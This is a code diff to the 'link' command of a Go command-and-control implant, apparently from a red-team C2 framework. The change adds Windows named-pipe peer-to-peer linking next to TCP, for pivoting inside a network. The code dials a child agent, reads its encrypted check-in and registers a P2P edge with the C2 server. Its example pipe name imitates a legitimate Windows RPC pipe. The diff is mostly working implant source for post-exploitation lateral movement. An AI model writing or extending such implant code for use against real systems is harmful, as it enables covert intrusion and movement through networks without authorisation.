@@ -33,12 +33,14 @@ func (c *LinkCommand) Name() string {
 }
 
 func (c *LinkCommand) Description() string {
-	return "Link to a TCP P2P agent to establish a peer-to-peer connection for internal pivoting"
+	return "Link to a P2P agent via TCP or named pipe to establish a peer-to-peer connection for internal pivoting"
 }
 
 type linkArgs struct {
-	Host string `json:"host"`
-	Port int    `json:"port"`
+	Host           string `json:"host"`
+	Port           int    `json:"port"`
+	ConnectionType string `json:"connection_type"` // "tcp" (default) or "namedpipe"
+	PipeName       string `json:"pipe_name"`       // Named pipe name (without \\.\pipe\ prefix)
 }
 
 func (c *LinkCommand) Execute(task structs.Task) structs.CommandResult {
@@ -49,26 +51,46 @@ func (c *LinkCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	if args.Host == "" || args.Port == 0 {
-		return errorResult("Both host and port are required (e.g., {\"host\": \"10.0.0.2\", \"port\": 7777})")
+	if args.ConnectionType == "" {
+		args.ConnectionType = "tcp"
 	}
 
 	if tcpProfileInstance == nil {
-		return errorResult("TCP P2P not available — agent was not built with TCP profile support")
+		return errorResult("P2P not available — agent was not built with TCP profile support")
 	}
 
-	// Connect to the child agent's TCP listener
-	addr := net.JoinHostPort(args.Host, fmt.Sprintf("%d", args.Port))
-	conn, err := net.DialTimeout("tcp", addr, 15*time.Second)
+	var conn net.Conn
+	var displayAddr string
+	var err error
+
+	switch args.ConnectionType {
+	case "tcp":
+		if args.Host == "" || args.Port == 0 {
+			return errorResult("Both host and port are required for TCP link (e.g., {\"host\": \"10.0.0.2\", \"port\": 7777})")
+		}
+		displayAddr = net.JoinHostPort(args.Host, fmt.Sprintf("%d", args.Port))
+		conn, err = net.DialTimeout("tcp", displayAddr, 15*time.Second)
+
+	case "namedpipe":
+		if args.Host == "" || args.PipeName == "" {
+			return errorResult("Both host and pipe_name are required for named pipe link (e.g., {\"host\": \"10.0.0.2\", \"pipe_name\": \"msrpc-f9a1\"})")
+		}
+		displayAddr = fmt.Sprintf(`\\%s\pipe\%s`, args.Host, args.PipeName)
+		conn, err = dialNamedPipe(args.Host, args.PipeName, 15*time.Second)
+
+	default:
+		return errorf("Unknown connection_type: %s. Use: tcp, namedpipe", args.ConnectionType)
+	}
+
 	if err != nil {
-		return errorf("Failed to connect to %s: %v", addr, err)
+		return errorf("Failed to connect to %s: %v", displayAddr, err)
 	}
 
 	// Read the child's initial checkin message (length-prefixed)
 	data, err := recvTCPFramed(conn)
 	if err != nil {
 		conn.Close()
-		return errorf("Failed to read child checkin from %s: %v", addr, err)
+		return errorf("Failed to read child checkin from %s: %v", displayAddr, err)
 	}
 
 	// The child sends base64(UUID + encrypted_body).
@@ -76,7 +98,7 @@ func (c *LinkCommand) Execute(task structs.Task) structs.CommandResult {
 	decoded, err := base64.StdEncoding.DecodeString(string(data))
 	if err != nil || len(decoded) < 36 {
 		conn.Close()
-		return errorf("Invalid checkin data from %s", addr)
+		return errorf("Invalid checkin data from %s", displayAddr)
 	}
 	childUUID := string(decoded[:36])
 
@@ -92,13 +114,13 @@ func (c *LinkCommand) Execute(task structs.Task) structs.CommandResult {
 
 	// Send edge notification (P2P graph link)
 	tcpProfileInstance.EdgeMessages <- structs.P2PConnectionMessage{
-		Source:        tcpProfileInstance.CallbackUUID,
+		Source:        tcpProfileInstance.GetCallbackUUID(),
 		Destination:   childUUID,
 		Action:        "add",
 		C2ProfileName: "tcp",
 	}
 
-	return successf("Successfully linked to %s (child UUID: %s)", addr, childUUID[:8])
+	return successf("Successfully linked to %s via %s (child UUID: %s)", displayAddr, args.ConnectionType, childUUID[:8])
 }
 
 // recvTCPFramed reads a length-prefixed TCP message (4-byte big-endian length + payload).
